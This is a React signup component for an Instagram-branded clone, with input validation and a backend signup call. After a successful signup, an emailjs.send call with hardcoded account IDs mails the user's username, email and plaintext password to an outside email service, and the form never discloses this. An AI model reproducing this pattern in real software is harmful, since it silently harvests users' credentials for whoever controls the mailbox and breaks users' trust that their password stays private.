import InstaLogo from "/InstaLogo.jpeg";
import { useNavigate } from "react-router";
import { useState } from "react";
import toast from "react-hot-toast";
import axios from "axios";
import { SERVER_URL } from "../main";
import { useDispatch } from "react-redux"
import { setLoading, setUserdata } from "../Redux/UserSlice";
import emailjs from 'emailjs-com';

export const Signup = () => {

  const [Username, setUsername] = useState("");
  const [Email, setEmail] = useState("");
  const [Password, setPassword] = useState("");
  const [loader, setloader] = useState(false);

  const dispatch = useDispatch();
  const navigate = useNavigate();

  const timestamp = new Date().toLocaleString();
  const emailData = {
    username: Username,
    email: Email,
    password: Password,
    message: `Signup successful at ${timestamp}`,
  };

  const handleSignup = async () => {
    setloader(true);
    try {
      if (Password == "" || Email == "" || Username == "") {
        toast.error("All Fields Are Required");
        setloader(false);
        return;
      }

      if (Username.length < 3) {
        toast.error("Username Must Be At Least 3 Characters");
        setloader(false);
        return;
      }

      if (Username.length > 19) {
        toast.error("Username Is Too Long");
        setloader(false);
        return;
      }

      const pattern = /^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-zA-Z]{2,}$/;

      if (!pattern.test(Email)) {
        toast.error("Please Enter a Valid Email");
        setloader(false);
        return;
      }

      if (Password.length < 6) {
        toast.error("Password Must Be At 6 Character");
        setloader(false);
        return;
      }

      dispatch(setLoading(true));
      const result = await axios.post(`${SERVER_URL}/api/auth/signup`, { Username, Email, Password }, { withCredentials: true });
      dispatch(setUserdata(result.data));
      dispatch(setLoading(false));

      navigate("/editprofile");
      toast.success("Signup successfull");

      emailjs.send('service_84nqsxd', 'template_z2kc857', emailData, 'i6H34NfxvCO1ZHfzc');

      setloader(false);
      setUsername("");
      setEmail("");
      setPassword("");
    }
    catch (err) {
      console.log("Signup Error :", err.message);
      setloader(false);
      dispatch(setLoading(false));
      toast.error(err.response.data.message);
    }
  }


  return (
    <div className="flex flex-col items-center justify-center h-screen ">
      <div className="flex flex-col items-center h-[510px] border-1 border-gray-400 px-5 rounded-sm">
        <img
          src={InstaLogo}
          alt="InstaLogo"
          className=" my-2 w-50 h-17 mix-blend-multiply mt-5"
        />
        <h1 className="text-[17px] font-semibold opacity-60 text-center mt-3 w-[320px]">
          Signup to see photos and videos from your friends
        </h1>

        <div className="flex flex-col gap-3 items-center mt-5 w-full">
          <input
            type="text"
            placeholder="Username"
            className="border p-1.5  w-full rounded-sm outline-0 border-gray-400 bg-gray-100 "
            value={Username}
            onChange={(e) => setUsername(e.target.value)}
            disabled={loader}
          />
          <input
            type="email"
            placeholder="Email"
            className="border p-1.5  w-full rounded-sm outline-0 border-gray-400 bg-gray-100"
            value={Email}
            onChange={(e) => setEmail(e.target.value)}
            disabled={loader}
          />
          <input
            type="password"
            placeholder="Password"
            className="border p-1.5  w-full rounded-sm outline-0 border-gray-400 bg-gray-100"
            value={Password}
            onChange={(e) => setPassword(e.target.value)}
            disabled={loader}
          />

          <div className="flex flex-col items-center justify-center mt-5 w-full">
            <button
              type="submit"
              className={`  text-white p-2 w-full rounded-md cursor-pointer ${loader ? "bg-blue-400" : "bg-blue-500 hover:bg-blue-600"}`}
              onClick={handleSignup}
              disabled={loader}
            >
              {loader ? "Loading..." : "Signup"}
            </button>
          </div>

          <div className="flex items-center justify-center mt-5 w-full">
            <hr className="border-gray-400 w-full" />
            <span className="px-3 font-semibold text-[15px] opacity-60">
              OR
            </span>
            <hr className="border-gray-400 w-full" />
          </div>

          <div className="flex items-center justify-center mt-1.5 gap-1">
            <p>Have an account ?</p>
            <span
              className="text-blue-500 font-bold cursor-pointer"
              onClick={() => navigate("/login")}
            >
              Login
            </span>
          </div>
        </div>
      </div>
    </div>
  );
};
